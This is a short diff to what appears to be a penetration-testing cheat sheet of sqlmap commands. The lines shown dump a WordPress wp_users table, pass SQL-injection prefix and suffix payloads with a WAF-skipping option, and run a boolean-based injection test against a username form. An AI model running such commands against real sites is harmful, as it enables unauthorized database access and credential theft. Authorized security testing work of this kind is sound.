@@ -25,7 +25,10 @@ sqlmap.py -I rawrequest2.raw --tables
 sqlmap.py -l rawrequest2.raw --dump -D wordpress -T wp_users
 
 #Advanced Usage
-sqlmap -l /tmp/burp.log --scope="site.org" --dbms=mssql --os=windows --prefix="')" --suffix=" AND ('a'='a" --string="found --technique=BT --regex="User.+found" --level=5 --risk=3 --skip-waf --proxy=PROXY 
+sqlmap -l /tmp/burp.log --scope="site.org" --dbms=mssql --os=windows --prefix="')" --suffix=" AND ('a'='a" --string="found --technique=BT --regex="User.+found" --level=5 --risk=3 --skip-waf --proxy=PROXY --flush-session
+
+#Advanced Usage2 
+sqlmap -u http://url.com/username.aspx --technique=B --data="username=rturner" --string="not available" --flush-session
 {% endhighlight %}
 
 > **Riding Sessions**
